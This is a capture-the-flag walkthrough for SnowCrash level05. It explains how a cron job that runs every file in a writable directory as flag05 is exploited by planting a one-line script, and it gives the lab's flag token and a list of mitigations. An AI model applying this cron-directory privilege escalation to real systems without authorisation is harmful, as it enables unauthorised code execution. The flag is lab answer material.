# SnowCrash Level05 Walkthrough

## Overview

Level05 demonstrates exploitation through **cron job manipulation** and **directory write permissions**. This level shows how scheduled tasks running with elevated privileges can be exploited when they process user-writable directories.

## Initial Investigation

Upon logging into the level05 user, we find no obvious files in the home directory:

```bash
level05@SnowCrash:~$ ls -la
total 13
dr-xr-x---+ 1 level05 level05   120 Mar  5  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level05 level05   220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05  3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05   675 Apr  3  2012 .profile
```

Since there are no obvious clues, we need to investigate what files are owned by the `flag05` user.

## Finding flag05 Owned Files

We search the entire filesystem for files owned by `flag05`:

```bash
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

### Key Discoveries

- Two files are owned by `flag05`
- Both are located in system directories (`/usr/sbin/` and `/rofs/usr/sbin/`)
- The names suggest they're related to OpenArena server management

## Script Analysis

Let's examine the contents of these files:

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

```bash
level05@SnowCrash:~$ cat /rofs/usr/sbin/openarenaserver
cat: /rofs/usr/sbin/openarenaserver: Permission denied
```

### Script Breakdown

The `/usr/sbin/openarenaserver` script does the following:

1. **Iterates through files**: `for i in /opt/openarenaserver/* ; do`
2. **Executes each file**: `(ulimit -t 5; bash -x "$i")`
   - `ulimit -t 5`: Sets a 5-second CPU time limit
   - `bash -x "$i"`: Executes the file with bash in debug mode
3. **Deletes the file**: `rm -f "$i"`

### Vulnerability Analysis

This script presents several attack vectors:

- **Arbitrary Code Execution**: Any file in `/opt/openarenaserver/` gets executed
- **Privilege Escalation**: The script runs with `flag05` privileges
- **Self-Cleaning**: Files are deleted after execution (stealth aspect)

## Checking Directory Permissions

Let's verify we can write to the target directory:

```bash
level05@SnowCrash:~$ ls -la /opt/
total 1
drwxr-xr-x  1 root root   60 Jul 18 15:04 .
drwxr-xr-x  1 root root  220 Aug 30  2015 ..
drwxrwxr-x+ 2 root root   60 Jul 18 18:08 openarenaserver
```

The directory has `drwxrwxr-x+` permissions, meaning:

- **Owner (root)**: Read, write, execute
- **Group**: Read, write, execute
- **Others**: Read, execute
- **+**: Extended ACL permissions (likely allowing our user to write)

## Understanding the Execution Mechanism

When we try to run the script manually:

```bash
level05@SnowCrash:~$ /usr/sbin/openarenaserver
-bash: /usr/sbin/openarenaserver: Permission denied
```

We get permission denied, indicating the script isn't meant to be run directly by our user.

## Discovering the Cron Job

Let's investigate how this script gets executed by checking system locations:

```bash
level05@SnowCrash:~$ find / -name level05 2> /dev/null
/var/mail/level05
/rofs/var/mail/level05
```

Checking the mail file:

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

### Cron Job Analysis

This is a **cron job configuration** that:

- **Schedule**: `*/2 * * * *` - Runs every 2 minutes
- **Command**: `su -c "sh /usr/sbin/openarenaserver" - flag05`
- **Privilege**: Executes as the `flag05` user
- **Effect**: Automatically runs our target script with elevated privileges

## Exploitation Strategy

The attack plan:

1. **Create a malicious script** that executes `getflag`
2. **Place it in `/opt/openarenaserver/`** where the cron job will find it
3. **Redirect output** to a file we can access
4. **Wait for the cron job** to execute our script

### Step 1: Create the Malicious Script

```bash
level05@SnowCrash:~$ echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
```

This script:

- Executes `/bin/getflag`
- Redirects output to `/tmp/flag05`
- Will run with `flag05` privileges when the cron job executes

### Step 2: Verify File Placement

```bash
level05@SnowCrash:~$ ls -la /opt/openarenaserver/
total 4
drwxrwxr-x+ 2 root    root    60 Jul 18 18:08 .
drwxr-xr-x  1 root    root    60 Jul 18 15:04 ..
-rw-rw-r--+ 1 level05 level05 28 Jul 18 18:08 getflag05
```

Our script is successfully placed and has appropriate permissions.

### Step 3: Wait for Cron Execution

Since the cron job runs every 2 minutes, we wait for the next execution cycle:

```bash
level05@SnowCrash:~$ date
Thu Jul 18 18:08:30 UTC 2025
```

After waiting approximately 2 minutes...

### Step 4: Retrieve the Flag

```bash
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Security Implications

This level demonstrates several critical security vulnerabilities:

### 1. **Insecure Cron Jobs**

- Running scripts from user-writable directories
- Automatic execution without proper validation
- Elevated privileges for scheduled tasks

### 2. **Directory Permissions**

- World-writable directories in system locations
- Insufficient access controls on sensitive directories

### 3. **Privilege Escalation**

- Automated privilege escalation through cron
- Lack of input validation for executed scripts

## Mitigation Strategies

To prevent such vulnerabilities:

1. **Secure Directory Permissions**: Restrict write access to system directories
2. **Validate Script Sources**: Only execute scripts from trusted locations
3. **Principle of Least Privilege**: Run cron jobs with minimal required permissions
4. **Input Validation**: Validate script contents before execution
5. **Monitoring**: Log and monitor automated script execution
6. **File Integrity**: Use checksums or signatures for executed scripts

## Understanding Cron Syntax

The cron expression `*/2 * * * *` breaks down as:

- **`*/2`**: Every 2 minutes
- **`*`**: Every hour
- **`*`**: Every day of month
- **`*`**: Every month
- **`*`**: Every day of week

## Real-World Relevance

This attack pattern is common in:

- **Web servers** with insecure file upload handling
- **Backup systems** that process user-controlled directories
- **Log rotation** scripts with insufficient permission checks
- **Automated deployment** systems with weak validation

## Flag

```
viuaaale9huek52boumoomioc
```

This flag allows access to the next level of the SnowCrash challenge.

## Key Learnings

1. **Cron Job Security**: Understanding how scheduled tasks can be exploited
2. **Directory Permissions**: The importance of proper file system permissions
3. **Privilege Escalation**: How automated systems can amplify security vulnerabilities
4. **System Reconnaissance**: Techniques for discovering hidden attack vectors
5. **Persistence Mechanisms**: How attackers can maintain access through scheduled tasks
6. **File System Investigation**: Using `find` and other tools to discover attack surfaces

## Tools and Techniques Used

- **find**: For discovering files owned by specific users
- **cron**: Understanding scheduled task execution
- **File permissions**: Analyzing directory access controls
- **Shell scripting**: Creating malicious payloads
- **System reconnaissance**: Investigating mail and system files
